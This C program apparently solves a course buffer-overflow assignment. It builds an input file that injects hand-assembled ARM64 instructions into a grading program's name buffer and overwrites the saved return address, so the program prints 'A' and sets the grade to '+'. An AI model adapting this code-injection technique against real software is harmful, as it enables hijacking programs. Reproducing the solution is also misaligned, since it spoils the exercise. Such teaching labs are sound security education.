/*----------------------------------------------------------------------
createdataAplus.c
Produces a file called dataAplus with the student name, a nullbyte,
instruction to print "A" to stdout, instruction to overwrite the grade
variable to '+', and the address of the instruction in bss to print "A",
which will overwrite getName's stored x30.
----------------------------------------------------------------------*/

#include "miniassembler.h"
#include <stdio.h>
#include <stdlib.h>

/* Take no argument. Writes in a file named dataAplus and returns 0. */
int main(void)
{
    FILE *psFile;
    const char *name = "Ryo, Seungho";
    const char *AStr = "A";
    int i;
    unsigned int instr1, instr2, instr3, instr4, instr5, instr6;
    unsigned long nameArray = 0x420058;
    /* The distance between buffer array to getName's x30 */
    int distance = 88 - 40;

    psFile = fopen("dataAplus", "w");
    /* Write names */
    fprintf(psFile, "%s", name);
    /* Length up until now is 12, add nullbytes for a padding */
    for (i = 0; i < 4; i++)
        fprintf(psFile, "%c", 0x00);
    /* Store a "A" string at name[16] */
    fprintf(psFile, "%s", AStr);
    for (i = 0; i < 3; i++)
        fprintf(psFile, "%c", 0x00);
    /* Assembly code */
    /* printf("A"); */
    /* adr x0, address of the format string - name[20] */
    instr5 = MiniAssembler_adr(0, nameArray + 16, nameArray + 20);
    (void)fwrite(&instr5, sizeof(unsigned int), 1, psFile);
    /* bl	0x400690 <printf@plt> - name[24] */
    instr6 = MiniAssembler_bl(0x400690, nameArray + 24);
    (void)fwrite(&instr6, sizeof(unsigned int), 1, psFile);
    /* overwrite grade variable */
    /* mov w0, '+' - name[28] */
    instr1 = MiniAssembler_mov(0, (int)'+');
    (void)fwrite(&instr1, sizeof(unsigned int), 1, psFile);
    /* adr x1, grade - name[32] */
    instr2 = MiniAssembler_adr(1, 0x420044, nameArray + 32);
    (void)fwrite(&instr2, sizeof(unsigned int), 1, psFile);
    /* strb w0, [x1] - name[36] */
    instr3 = MiniAssembler_strb(0, 1);
    (void)fwrite(&instr3, sizeof(unsigned int), 1, psFile);
    /* b 0x40089c - name[40] */
    instr4 = MiniAssembler_b(0x40089c, nameArray + 40);
    (void)fwrite(&instr4, sizeof(unsigned int), 1, psFile);

    /* There are 44 elements in the array up until now */
    distance -= 44;
    /* Write nullbytes to overload stack */
    for (i = 0; i < distance; i++)
        fprintf(psFile, "%c", 0x00);
    /* Overwrite x30 address */
    nameArray += 20;
    fwrite(&nameArray, sizeof(unsigned long), 1, psFile);

    fclose(psFile);

    return 0;
}
